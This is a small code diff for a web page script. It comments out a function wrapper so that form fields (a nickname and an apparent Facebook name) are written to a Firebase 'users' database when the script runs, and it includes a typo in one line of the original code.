@@ -166,7 +166,7 @@ var firebaseConfig = {
   
   var ref = firebase.database().ref('users');
   
-  function info() {
+  //function info() {
   ref.push().set({
   nicname: document.querySelector("#nicname").value,
   namafb: document.querySelector("#namafb").value,
@@ -175,7 +175,7 @@ var firebaseConfig = {
   });
   alert("selesai diproses");
   documemt.querySelector("#top").click();
-  }
+//  }
 </script>
 
 <body>
